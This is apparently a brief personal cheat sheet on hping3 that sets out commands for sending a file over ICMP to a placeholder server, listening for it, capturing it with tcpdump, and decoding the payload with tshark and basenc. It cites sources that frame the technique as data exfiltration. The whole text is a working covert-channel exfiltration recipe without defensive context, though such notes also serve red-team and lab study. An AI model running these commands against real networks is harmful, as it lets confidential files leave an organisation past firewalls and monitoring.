# Hping3

https://www.commandlinefu.com/commands/view/12851/sending-a-file-over-icmp-with-hping

```
# hping3 -I <interface> -9 <IP> -e MYSIG > confidential.txt
```

The sender

```
# hping3 <server_IP> --icmp --sign MSGID1 -d 50 -c 1 --file a_file
```

The reciever

```
# hping3 -I eth0 --listen <server_IP> --sign MSGID1
```

## Using tcpdump

https://secforge.io/blog/hping3

https://www.phoenixinfosec.com/post/data-exfiltration-with-hping3

```
# hping3 -1 -E file.txt -u -d 1500 <server_IP>

# tcpdump -i <interface> "icmp and src host <client_IP>" -w file.pcap
```

To extract the data.

```
$ tshark -n -q -r file.pcap -T fields -e data.data | tr -d "\n" | tr -d ":" > hex.txt

$ basenc -d --base16 hex.txt
```